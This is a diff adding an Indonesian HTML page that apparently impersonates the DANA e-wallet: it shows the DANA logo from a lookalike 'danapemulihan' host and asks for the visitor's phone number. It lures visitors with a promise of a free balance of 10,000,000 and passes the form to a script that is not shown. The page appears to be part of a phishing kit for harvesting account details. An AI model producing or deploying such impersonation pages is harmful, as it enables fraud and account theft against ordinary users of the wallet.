@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan Nomor HP</title>
+    <link rel="stylesheet" href="phone.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" 
+                 alt="Logo DANA" width="100" height="100">
+        </div>
+        <p>Masukkan nomor HP kamu untuk lanjut</p>
+        <form id="phoneForm">
+            <div class="input-group">
+                <div class="country-code">
+                    <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" 
+                         alt="Bendera Indonesia" width="20" height="20">
+                    <span>+62</span>
+                </div>
+                <input class="phone-number" id="phoneNumber" type="tel" 
+                       placeholder="811-1234-5678" required maxlength="15">
+            </div>
+            <p class="info-text"></p>
+                Dengan melanjutkan, kamu juga setuju dengan S&amp;K serta Kebijakan Privasi kami.
+            </p>
+            <div class="location-access">
+                <i class="fas fa-map-marker-alt"></i>
+                ayo aktifkan hadiah kamu untuk menerima hadiah saldo gratis dana 10.000.000
+            </div>
+            <input class="submit-button" type="submit" value="LANJUTKAN">
+        </form>
+    </div>
+    <script src="phone.js"></script>
+</body>
+</html>
